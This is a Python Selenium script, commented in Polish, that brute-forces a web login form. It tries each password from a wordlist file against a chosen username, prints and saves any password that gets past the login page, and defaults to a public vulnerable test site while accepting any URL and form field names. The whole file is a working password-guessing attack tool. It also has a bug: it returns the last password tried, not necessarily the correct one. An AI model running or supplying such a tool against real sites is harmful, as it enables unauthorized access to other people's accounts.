from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support import expected_conditions as EC
from datetime import datetime


def getUrl():
    site = input("Podaj adres strony:")
    if site == "test":
        site = "http://testphp.vulnweb.com/login.php"
    else:
        site = site
    return site


"""Obłsuga listy hasłę"""


def read_list_from_file(filename):
    file_handler = open(filename + ".txt", "r")
    read_list = file_handler.readlines()
    file_handler.close()
    return read_list


def getUserName():
    username = input("Podaj nazwę użytkownik:")  # test
    if username != "":
        pass
    else:
        print("Nazwa użytkownika nie może być pusta:")
    return username


def getPasswordFile():
    passfile = input("Podaj nazwę pliku haseł :")  # passw
    if passfile == "":
        passfile = "pass_list"
    else:
        passfile = passfile
    return passfile


"""Osługa strony"""


def getUserNameDrver():
    username_driver = input("Podaj nazwę elmentu z nazwą użytkownika: ")
    if username_driver == "":
        username_driver = "uname"
    else:
        username_driver = username_driver
    return username_driver


def getPasswordDriver():
    password_driver = input("Podaj nazwę elmentu z hasłem: ")
    if password_driver == "":
        password_driver = "pass"
    else:
        password_driver = password_driver
    return password_driver


def getSubmiteDriver():
    cssclick = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(3) > td > input[type=submit]"
    return cssclick


def findPassword(driver, username_driver, username, password_drive, paswords_list, cssclick):
    for password in paswords_list:
        driver.find_element(by=By.NAME, value=username_driver).send_keys(username)
        driver.find_element(by=By.NAME, value=password_drive).send_keys(password)
        driver.find_element(by=By.CSS_SELECTOR, value=cssclick).click()
        try:  # obsługa błedówtest
            WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.NAME, "uname")))
        except:
            print("Correct password is ==> " + password + " <==")
    return password


def writeToFile(password):
    test_date = datetime.now()
    test_date_file = datetime.now().strftime("%Y-%m-%d T %H-%M-%S")
    file_write = open("ok_password " + str(test_date_file) + ".txt", "w")
    file_write.write("Test date: " + str(test_date) + " \n Correct password is ==> " + password + " <==")


def main():
    url = getUrl()
    user_name = getUserName()
    passfile = getPasswordFile()
    paswords = read_list_from_file(passfile)
    user_name_drive = getUserNameDrver()
    password_driver = getPasswordDriver()
    submite_driver = getSubmiteDriver()
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
    driver.get(url)
    ok_password = findPassword(driver=driver,
                               username_driver=user_name_drive,
                               username=user_name,
                               password_drive=password_driver,
                               paswords_list=paswords,
                               cssclick=submite_driver)
    #driver.close()
    writeToFile(ok_password)

main()
